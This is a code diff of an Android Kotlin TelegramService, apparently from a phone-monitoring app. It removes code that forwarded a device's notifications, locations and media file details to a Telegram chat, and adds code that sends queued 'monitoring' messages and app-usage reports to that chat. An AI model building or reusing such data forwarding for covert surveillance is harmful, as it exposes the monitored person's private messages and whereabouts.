@@ -80,47 +80,22 @@ class TelegramService : Service() {
         if (!isOnline()) return
         
         database?.let { db ->
-            // Process pending notifications
-            val unsentNotifications = db.notificationDao().getUnsentNotifications()
-            unsentNotifications.forEach { notification ->
-                val success = sendNotificationAlert(
-                    notification.appName,
-                    notification.title,
-                    notification.text,
-                    notification.timestamp
-                )
-                if (success) {
-                    db.notificationDao().markAsSent(notification.id)
-                }
-            }
-            
-            // Process pending locations
-            val unsentLocations = db.locationDao().getUnsentLocations()
-            unsentLocations.forEach { location ->
-                val success = sendLocationUpdate(
-                    location.latitude,
-                    location.longitude,
-                    location.accuracy,
-                    location.address,
-                    location.timestamp
-                )
-                if (success) {
-                    db.locationDao().markAsSent(location.id)
-                }
-            }
-            
-            // Process pending media files
-            val unsentMediaFiles = db.mediaFileDao().getUnsentMediaFiles()
-            unsentMediaFiles.forEach { mediaFile ->
-                val success = sendMediaFileAlert(
-                    mediaFile.fileName,
-                    mediaFile.filePath,
-                    mediaFile.fileType,
-                    mediaFile.fileSize,
-                    mediaFile.dateAdded
-                )
-                if (success) {
-                    db.mediaFileDao().markAsSent(mediaFile.id)
+            // Process pending telegram messages
+            val unsentMessages = db.monitoringDao().getUnsentMessages()
+            unsentMessages.forEach { message ->
+                scope.launch {
+                    try {
+                        val response = telegramApi?.sendMessage(
+                            chatId = message.chatId,
+                            text = message.message
+                        )
+                        if (response?.ok == true) {
+                            val updatedMessage = message.copy(sent = true)
+                            db.monitoringDao().updateTelegramMessage(updatedMessage)
+                        }
+                    } catch (e: Exception) {
+                        // Handle send error
+                    }
                 }
             }
         }
@@ -272,11 +247,8 @@ class TelegramService : Service() {
     suspend fun sendMessage(text: String): Boolean {
         return try {
             telegramApi?.sendMessage(
-                TelegramMessage(
-                    chatId = chatId!!,
-                    text = text,
-                    parseMode = "HTML"
-                )
+                chatId = chatId!!,
+                text = text
             )
             true
         } catch (e: Exception) {
@@ -307,7 +279,7 @@ class TelegramService : Service() {
         builder.append("Time: ${getCurrentTimeString()}\n\n")
         
         usageData.forEach { data ->
-            val timeUsedMinutes = data.timeUsed / (1000 * 60)
+            val timeUsedMinutes = data.usageTime / (1000 * 60)
             val lastUsedTime = dateFormat.format(Date(data.lastTimeUsed))
             
             builder.append("📋 <b>${data.appName}</b>\n")
